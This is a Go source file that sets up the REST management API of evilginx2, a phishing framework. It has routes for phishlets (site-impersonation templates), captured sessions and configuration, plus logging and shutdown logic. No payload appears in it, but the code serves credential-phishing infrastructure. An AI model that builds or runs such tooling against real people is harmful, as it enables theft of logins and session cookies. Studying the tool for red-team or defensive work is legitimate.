package api

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/kgretzky/evilginx2/internal/phishlet"
	"github.com/kgretzky/evilginx2/internal/storage"
	"github.com/kgretzky/evilginx2/pkg/models"
)

type Server struct {
	router       *gin.Engine
	storage      storage.Interface
	config       *models.Config
	port         string
	server       *http.Server
	phishletRepo *phishlet.PhishletRepository
	handlers     *Handlers
}

type Handlers struct {
	storage      storage.Interface
	phishletRepo *phishlet.PhishletRepository
}

func NewServer(storage storage.Interface, config *models.Config, port string, phishletRepo *phishlet.PhishletRepository) *Server {
	gin.SetMode(gin.ReleaseMode)
	
	handlers := &Handlers{
		storage:      storage,
		phishletRepo: phishletRepo,
	}
	
	s := &Server{
		router:       gin.Default(),
		storage:      storage,
		config:       config,
		port:         port,
		phishletRepo: phishletRepo,
		handlers:     handlers,
	}
	
	s.setupMiddleware()
	s.setupRoutes()
	
	return s
}

func (s *Server) setupMiddleware() {
	s.router.Use(gin.Recovery())
	s.router.Use(func(c *gin.Context) {
		c.Header("Content-Type", "application/json")
		c.Header("X-Content-Type-Options", "nosniff")
		c.Header("X-Frame-Options", "DENY")
		c.Header("X-XSS-Protection", "1; mode=block")
		c.Next()
	})
	
	s.router.Use(func(c *gin.Context) {
		start := time.Now()
		c.Next()
		duration := time.Since(start)
		
		fmt.Printf("[API] %s %s - %d (%v)\n", 
			c.Request.Method, 
			c.Request.URL.Path, 
			c.Writer.Status(), 
			duration)
	})
}

func (s *Server) setupRoutes() {
	api := s.router.Group("/api/v1")
	
	api.GET("/health", s.healthCheck)
	
	phishlets := api.Group("/phishlets")
	phishlets.GET("", s.handlers.listPhishlets)
	phishlets.POST("", s.handlers.createPhishlet)
	phishlets.GET("/:name", s.handlers.getPhishlet)
	
	sessions := api.Group("/sessions")
	sessions.GET("", s.handlers.listSessions)
	sessions.POST("", s.handlers.createSession)
	sessions.GET("/:id", s.handlers.getSession)
	
	config := api.Group("/config")
	config.GET("", s.getConfig)
	config.PUT("", s.updateConfig)
}

func (s *Server) Start(ctx context.Context) error {
	s.server = &http.Server{
		Addr:    ":" + s.port,
		Handler: s.router,
	}
	
	fmt.Printf("Starting API server on port %s\n", s.port)
	
	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		s.server.Shutdown(shutdownCtx)
	}()
	
	if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		return fmt.Errorf("failed to start server: %w", err)
	}
	
	return nil
}

func (s *Server) Stop() error {
	if s.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		return s.server.Shutdown(ctx)
	}
	return nil
}

func (s *Server) healthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":    "healthy",
		"timestamp": time.Now().UTC(),
		"version":   "1.0.0",
	})
}
